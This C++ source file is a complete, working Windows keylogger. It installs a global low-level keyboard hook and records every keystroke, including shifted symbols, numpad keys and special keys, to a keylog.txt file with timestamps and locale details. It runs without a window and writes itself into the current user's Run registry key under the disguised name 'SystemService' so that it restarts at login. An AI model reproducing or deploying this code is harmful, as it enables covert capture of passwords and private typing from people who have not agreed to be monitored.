#include <iostream>
#include <windows.h>
#include <fstream>

HHOOK keyboardHook = NULL;

bool lShiftHeld = false;
bool rShiftHeld = false;

std::fstream logFile;

bool isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool isNumLockOn() {
    return (GetKeyState(VK_NUMLOCK) & 0x0001) != 0;
}

std::string getTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    char buf[64];
    snprintf(buf, sizeof(buf), "[%04d-%02d-%02d %02d:%02d:%02d]",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);

    return std::string(buf);
}

void specialKey(std::fstream &file, int key){
    switch(key){
        case 0x01 : file << "[LMB]"; break;          //Left mouse button
        case 0x02 : file << "[RMB]"; break;          //Right mouse button
        case 0x03 : file << "[Break Key]"; break;    //Cancel button
        case 0x04 : file << "[MMB]"; break;          //Middle mouse button
        case 0x05 : file << "[X1MB]"; break;         //X1 mouse button
        case 0x06 : file << "[X2MB]"; break;         //X2 mouse button

        case 0x07 : file << "[]"; break;             //Reserved key

        case 0x08 : file << "[Backspace]"; break;    //Backspace
        case 0x09 : file << "[Tab]"; break;          //Tab

        case 0x0A : file << "[]"; break;             //Reserved key
        case 0x0B : file << "[]"; break;             //Reserved key

        case 0x0C : file << "[Clear]"; break;        //Clear key
        case 0x0D : file << "[Enter]"; break;        //Enter

        case 0x0E : file << "[]"; break;             //Unassigned
        case 0x0F : file << "[]"; break;             //Unassigned

        case 0x10 : file << "[Shift]"; break;        //Shift
        case 0x11 : file << "[Ctrl]"; break;         //Ctrl
        case 0x12 : file << "[Alt]"; break;          //Alt
        case 0x13 : file << "[Pause]"; break;        //Pause
        case 0x14 : file << "[Caps Lock]"; break;    //Caps Lock

        case 0x15 : file << "[]"; break;             //IME Kana-Hangul mode
        case 0x16 : file << "[]"; break;             //IME ON
        case 0x17 : file << "[]"; break;             //IME Junja mode
        case 0x18 : file << "[]"; break;             //IME final mode
        case 0x19 : file << "[]"; break;             //IME Hanja-Kanji mode
        case 0x1A : file << "[]"; break;             //IME OFF
        case 0x1B : file << "[Esc]"; break;          //Escape
        case 0x1C : file << "[]"; break;             //IME convert
        case 0x1D : file << "[]"; break;             //IME non-convert
        case 0x1E : file << "[]"; break;             //IME accept
        case 0x1F : file << "[]"; break;             //IME mode change request

        case 0x20 : file << "[Spacebar]"; break;     //Spacebar
        case 0x21 : file << "[Page Up]"; break;      //Page Up
        case 0x22 : file << "[Page Down]"; break;    //Page
        case 0x23 : file << "[End]"; break;          //End
        case 0x24 : file << "[Home]"; break;         //Home
        case 0x25 : file << "[Left Arrow]"; break;   //Left Arrow
        case 0x26 : file << "[Up Arrow]"; break;     //Up Arrow
        case 0x27 : file << "[Right Arrow]"; break;  //Right Arrow
        case 0x28 : file << "[Down Arrow]"; break;   //Down Arrow
        case 0x29 : file << "[Select]"; break;       //Select key
        case 0x2A : file << "[Print]"; break;        //Print key
        case 0x2B : file << "[Execute]"; break;      //Execute key
        case 0x2C : file << "[Print Screen]"; break; //Print Screen
        case 0x2D : file << "[Insert]"; break;       //Insert key
        case 0x2E : file << "[Delete]"; break;       //Delete key
        case 0x2F : file << "[Help]"; break;         //Help

        case 0x3A : file << "[]"; break;             //Undefined
        case 0x3B : file << "[]"; break;             //Undefined
        case 0x3C : file << "[]"; break;             //Undefined
        case 0x3D : file << "[]"; break;             //Undefined
        case 0x3E : file << "[]"; break;             //Undefined
        case 0x3F : file << "[]"; break;             //Undefined
        case 0x40 : file << "[]"; break;             //Undefined

        case 0x5B : file << "[Left Windows Logo]"; break;   //Left Windows Logo key
        case 0x5C : file << "[Right Windows Logo]"; break;  //Right Windows Logo key
        case 0x5D : file << "[Application]"; break;         //Application key

        case 0x5E : file << "[]"; break;                    //Reserved

        case 0x5F : file << "[Sleep]"; break;               //Sleep key

        case 0x60: file << (isNumLockOn() ? "0" : "[Insert]"); break;               //Numeric keypad 0
        case 0x61: file << (isNumLockOn() ? "1" : "[End]"); break;                  //Numeric keypad 1
        case 0x62: file << (isNumLockOn() ? "2" : "[Down Arrow]"); break;           //Numeric keypad 2
        case 0x63: file << (isNumLockOn() ? "3" : "[Page Down]"); break;            //Numeric keypad 3
        case 0x64: file << (isNumLockOn() ? "4" : "[Left Arrow]"); break;           //Numeric keypad 4
        case 0x65: file << (isNumLockOn() ? "5" : ""); break;                       //Numeric keypad 5
        case 0x66: file << (isNumLockOn() ? "6" : "[Right Arrow]"); break;          //Numeric keypad 6
        case 0x67: file << (isNumLockOn() ? "7" : "[Home]"); break;                 //Numeric keypad 7
        case 0x68: file << (isNumLockOn() ? "8" : "[Up Arrow]"); break;             //Numeric keypad 8
        case 0x69: file << (isNumLockOn() ? "9" : "[Page Up]"); break;              //Numeric keypad 9
        case 0x6A : file << "*"; break;                                             //Multiply key
        case 0x6B : file << "+"; break;                                             //Add key
        case 0x6C : file << "|"; break;                                             //Separator key
        case 0x6D : file << "-"; break;                                             //Subtract key
        case 0x6E: file << (isNumLockOn() ? "." : "[Delete]"); break;               //Decimal point key
        case 0x6F : file << "/"; break;                                             //Divide key

        case 0x70 : file << "[F1]"; break;          //F1 key
        case 0x71 : file << "[F2]"; break;          //F2 key
        case 0x72 : file << "[F3]"; break;          //F3 key
        case 0x73 : file << "[F4]"; break;          //F4 key
        case 0x74 : file << "[F5]"; break;          //F5 key
        case 0x75 : file << "[F6]"; break;          //F6 key
        case 0x76 : file << "[F7]"; break;          //F7 key
        case 0x77 : file << "[F8]"; break;          //F8 key
        case 0x78 : file << "[F9]"; break;          //F9 key
        case 0x79 : file << "[F10]"; break;         //F10 key
        case 0x7A : file << "[F11]"; break;         //F11 key
        case 0x7B : file << "[F12]"; break;         //F12 key
        case 0x7C : file << "[F13]"; break;         //F13 key
        case 0x7D : file << "[F14]"; break;         //F14 key
        case 0x7E : file << "[F15]"; break;         //F15 key
        case 0x7F : file << "[F16]"; break;         //F16 key
        case 0x80 : file << "[F17]"; break;         //F17 key
        case 0x81 : file << "[F18]"; break;         //F18 key
        case 0x82 : file << "[F19]"; break;         //F19 key
        case 0x83 : file << "[F20]"; break;         //F20 key
        case 0x84 : file << "[F21]"; break;         //F21 key
        case 0x85 : file << "[F22]"; break;         //F22 key
        case 0x86 : file << "[F23]"; break;         //F23 key
        case 0x87 : file << "[F24]"; break;         //F24 key

        case 0x88 : file << "[]"; break;             //Reserved
        case 0x89 : file << "[]"; break;             //Reserved
        case 0x8A : file << "[]"; break;             //Reserved
        case 0x8B : file << "[]"; break;             //Reserved
        case 0x8C : file << "[]"; break;             //Reserved
        case 0x8D : file << "[]"; break;             //Reserved
        case 0x8E : file << "[]"; break;             //Reserved
        case 0x8F : file << "[]"; break;             //Reserved

        case 0x90 : file << "[Num Lock]"; break;     //Num Lock
        case 0x91 : file << "[Scroll Lock]"; break;  //Scroll Lock

        case 0x92 : file << "[]"; break;             //OEM specific
        case 0x93 : file << "[]"; break;             //OEM specific
        case 0x94 : file << "[]"; break;             //OEM specific
        case 0x95 : file << "[]"; break;             //OEM specific
        case 0x96 : file << "[]"; break;             //OEM specific

        case 0x97 : file << "[]"; break;             //Unassigned
        case 0x98 : file << "[]"; break;             //Unassigned
        case 0x99 : file << "[]"; break;             //Unassigned
        case 0x9A : file << "[]"; break;             //Unassigned
        case 0x9B : file << "[]"; break;             //Unassigned
        case 0x9C : file << "[]"; break;             //Unassigned
        case 0x9D : file << "[]"; break;             //Unassigned
        case 0x9E : file << "[]"; break;             //Unassigned
        case 0x9F : file << "[]"; break;             //Unassigned

        case 0xA0 : file << "[Left Shift]"; break;    //Left Shift
        case 0xA1 : file << "[Right Shift]"; break;   //Right Shift
        case 0xA2 : file << "[Left Ctrl]"; break;     //Left Control
        case 0xA3 : file << "[Right Ctrl]"; break;    //Right Control
        case 0xA4 : file << "[Left Alt]"; break;      //Left Alt
        case 0xA5 : file << "[Right Alt]"; break;     //Right Alt

        case 0xA6 : file << "[Browser Back]"; break;      //Browser Back
        case 0xA7 : file << "[Browser Forward]"; break;   //Browser Forward
        case 0xA8 : file << "[Browser Refresh]"; break;   //Browser Refresh
        case 0xA9 : file << "[Browser Stop]"; break;      //Browser Stop
        case 0xAA : file << "[Browser Search]"; break;    //Browser Search
        case 0xAB : file << "[Browser Favorites]"; break; //Browser Favorites
        case 0xAC : file << "[Browser Home]"; break;      //Browser Home

        case 0xAD : file << "[Volume Mute]"; break;       //Volume Mute
        case 0xAE : file << "[Volume Down]"; break;       //Volume Down
        case 0xAF : file << "[Volume Up]"; break;         //Volume Up
        case 0xB0 : file << "[Next Track]"; break;        //Next Track
        case 0xB1 : file << "[Previous Track]"; break;    //Previous Track
        case 0xB2 : file << "[Stop Media]"; break;        //Stop Media
        case 0xB3 : file << "[Play/Pause Media]"; break;  //Play/Pause Media
        case 0xB4 : file << "[Launch Mail]"; break;       //Launch Mail
        case 0xB5 : file << "[Select Media]"; break;      //Select Media

        case 0xB6 : file << "[Start Application 1]"; break; //Launch Application 1
        case 0xB7 : file << "[Start Application 2]"; break; //Launch Application 2

        case 0xB8 : file << "[]"; break;                   //Reserved
        case 0xB9 : file << "[]"; break;                   //Reserved

        case 0xBA : if(lShiftHeld || rShiftHeld){         //';:' key
                        file << ":"; 
                    } else {
                        file << ";"; 
                    }
                    break;             
        case 0xBB : if(lShiftHeld || rShiftHeld){         //'=+' key
                        file << "+"; 
                    } else {
                        file << "="; 
                    }
                    break;             
        case 0xBC : if(lShiftHeld || rShiftHeld){         //',<' key
                        file << "<"; 
                    } else {
                        file << ","; 
                    }
                    break;             
        case 0xBD : if(lShiftHeld || rShiftHeld){         //'-_' key
                        file << "_"; 
                    } else {
                        file << "-"; 
                    }
                    break;             
        case 0xBE : if(lShiftHeld || rShiftHeld){         //'.>' key
                        file << ">"; 
                    } else {
                        file << "."; 
                    }
                    break;             
        case 0xBF : if(lShiftHeld || rShiftHeld){         //'/?' key
                        file << "?"; 
                    } else {
                        file << "/"; 
                    }
                    break;             
        case 0xC0 : if(lShiftHeld || rShiftHeld){         //'`~' key
                        file << "~"; 
                    } else {
                        file << "`"; 
                    }
                    break;             
        
        case 0xC1 : file << "[]"; break;             //Reserved
        case 0xC2 : file << "[]"; break;             //Reserved

        case 0xC3 : file << "[Gamepad A]"; break;       //Gamepad A button
        case 0xC4 : file << "[Gamepad B]"; break;       //Gamepad B button
        case 0xC5 : file << "[Gamepad X]"; break;       //Gamepad X button
        case 0xC6 : file << "[Gamepad Y]"; break;       //Gamepad Y button
        case 0xC7 : file << "[Gamepad Right Shoulder]"; break; //Gamepad Right Shoulder button
        case 0xC8 : file << "[Gamepad Left Shoulder]"; break;  //Gamepad Left Shoulder button
        case 0xC9 : file << "[Gamepad Left Trigger]"; break;   //Gamepad Left Trigger button
        case 0xCA : file << "[Gamepad Right Trigger]"; break;  //Gamepad Right Trigger button
        case 0xCB : file << "[Gamepad DPad Up]"; break;        //Gamepad DPad Up button
        case 0xCC : file << "[Gamepad DPad Down]"; break;      //Gamepad DPad Down button
        case 0xCD : file << "[Gamepad DPad Left]"; break;      //Gamepad DPad Left button
        case 0xCE : file << "[Gamepad DPad Right]"; break;     //Gamepad DPad Right button
        case 0xCF : file << "[Gamepad Menu]"; break;          //Gamepad Menu button
        case 0xD0 : file << "[Gamepad View]"; break;          //Gamepad View button
        case 0xD1 : file << "[Gamepad Left Thumbstick]"; break;   //Gamepad Left Thumbstick button
        case 0xD2 : file << "[Gamepad Right Thumbstick]"; break;  //Gamepad Right Thumbstick button
        case 0xD3 : file << "[Gamepad Left Thubmstick Up]"; break;   //Gamepad Left Thubmstick Up
        case 0xD4 : file << "[Gamepad Left Thubmstick Down]"; break;  //Gamepad Right Thubmstick down
        case 0xD5 : file << "[Gamepad Left Thubmstick Right]"; break; //Gamepad Left Thubmstick Right
        case 0xD6 : file << "[Gamepad Left Thubmstick Left]"; break;  //Gamepad Left Thubmstick Left
        case 0xD7 : file << "[Gamepad Right Thubmstick Up]"; break;  //Gamepad Right Thubmstick Up
        case 0xD8 : file << "[Gamepad Right Thubmstick Down]"; break; //Gamepad Right Thubmstick Down
        case 0xD9 : file << "[Gamepad Right Thubmstick Right]"; break;    //Gamepad Right Thubmstick Right
        case 0xDA : file << "[Gamepad Right Thubmstick Left]"; break;     //Gamepad Right Thubmstick Left
    
        case 0xDB : if(lShiftHeld || rShiftHeld){         //'[{' key
                        file << "{"; 
                    } else {
                        file << "["; 
                    }
                    break;
        case 0xDC : if(lShiftHeld || rShiftHeld){         //'\|' key
                        file << "|"; 
                    } else {
                        file << "\\"; 
                    }
                    break;
        case 0xDD : if(lShiftHeld || rShiftHeld){         //']}' key
                        file << "}"; 
                    } else {
                        file << "]"; 
                    }
                    break;
        case 0xDE : if(lShiftHeld || rShiftHeld){         //''"' key
                        file << "\""; 
                    } else {
                        file << "'"; 
                    }
                    break;
        
        case 0xDF : file << "[Right Ctrl]"; break;          //Right Ctrl Key

        case 0xE0 : file << "[]"; break;                    //Reserved

        case 0xE1 : file << "[]"; break;                    //OEM specific

        case 0xE2 : if(lShiftHeld || rShiftHeld){         //'\|' key
                        file << "|"; 
                    } else {
                        file << "\\"; 
                    }
                    break;
        
        case 0xE3 : file << "[]"; break;                    //OEM specific
        case 0xE4 : file << "[]"; break;                    //OEM specific

        case 0xE5 : file << "[IME Process]"; break;         //IME Process key

        case 0xE6 : file << "[]"; break;                    //OEM specific

        case 0xE7 : file << "[Unicode Characters]"; break;  //Unicode characters 

        case 0xE8 : file << "[]"; break;                    //Unassigned

        case 0xE9 : file << "[OEM specific]"; break;        //OEM specific
        case 0xEA : file << "[OEM specific]"; break;        //OEM specific
        case 0xEB : file << "[OEM specific]"; break;        //OEM specific
        case 0xEC : file << "[OEM specific]"; break;        //OEM specific
        case 0xED : file << "[OEM specific]"; break;        //OEM specific
        case 0xEE : file << "[OEM specific]"; break;        //OEM specific
        case 0xEF : file << "[OEM specific]"; break;        //OEM specific
        case 0xF0 : file << "[]"; break;                    //OEM specific
        case 0xF1 : file << "[]"; break;                    //OEM specific
        case 0xF2 : file << "[]"; break;                    //OEM specific
        case 0xF3 : file << "[]"; break;                    //OEM specific
        case 0xF4 : file << "[]"; break;                    //OEM specific
        case 0xF5 : file << "[]"; break;                    //OEM specific

        case 0xF6 : file << "[Attn Key]"; break;                    //Attn key   
        case 0xF7 : file << "[CrSel Key]"; break;                   //CrSel key
        case 0xF8 : file << "[ExSel Key]"; break;                   //ExSel key
        case 0xF9 : file << "[Erase EOF Key]"; break;               //Erase EOF key
        case 0xFA : file << "[Play Key]"; break;                    //Play key
        case 0xFB : file << "[Zoom Key]"; break;                    //Zoom key       
        case 0xFC : file << "[Reserved]"; break;                     //Reserved         
        case 0xFD : file << "[PA1 Key]"; break;                   //PA1 key
        case 0xFE : file << "[Clear Key]"; break;                 //Clear key            
        
        default : file << "[Unknown Key]"; break;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = kb->vkCode;
        bool isDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        if (vk == VK_LSHIFT) { lShiftHeld = isDown; return CallNextHookEx(keyboardHook, nCode, wParam, lParam); }
        if (vk == VK_RSHIFT) { rShiftHeld = isDown; return CallNextHookEx(keyboardHook, nCode, wParam, lParam); }

        if (isDown) {
            bool shift = lShiftHeld || rShiftHeld;

            if (vk >= 0x41 && vk <= 0x5A) {
                bool upper = (GetKeyState(VK_CAPITAL) & 1) ^ shift;
                logFile << (char)(upper ? vk : vk + 32);

            } else if (vk >= 0x30 && vk <= 0x39) {
                if (shift) {
                    const char shiftDigits[] = ")!@#$%^&*(";
                    logFile << shiftDigits[vk - 0x30];
                } else {
                    logFile << (char)vk;
                }

            } else {
                specialKey(logFile, vk);
            }

            logFile.flush();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string logPath(exePath);
    logPath = logPath.substr(0, logPath.find_last_of("\\/")) + "\\keylog.txt";

    HKL hkl = GetKeyboardLayout(0);
    LANGID langId = LOWORD(hkl);
    char langName[256];
    char localeName[256];
    GetLocaleInfoA(langId, LOCALE_SENGLISHLANGUAGENAME, langName, sizeof(langName));
    GetLocaleInfoA(langId, LOCALE_SLOCALIZEDDISPLAYNAME, localeName, sizeof(localeName));

    logFile.open(logPath, std::ios::out | std::ios::app);
    if(!logFile.is_open()) return 1;

    logFile << "\n" << getTimestamp() << "\n";
    logFile << "Language: " << langName << "\n" << "Locale: " << localeName << '\n';
    logFile.flush();

    keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(!keyboardHook) return 1;

    HKEY hKey;
    if(RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    logFile.close();
    return 0;
}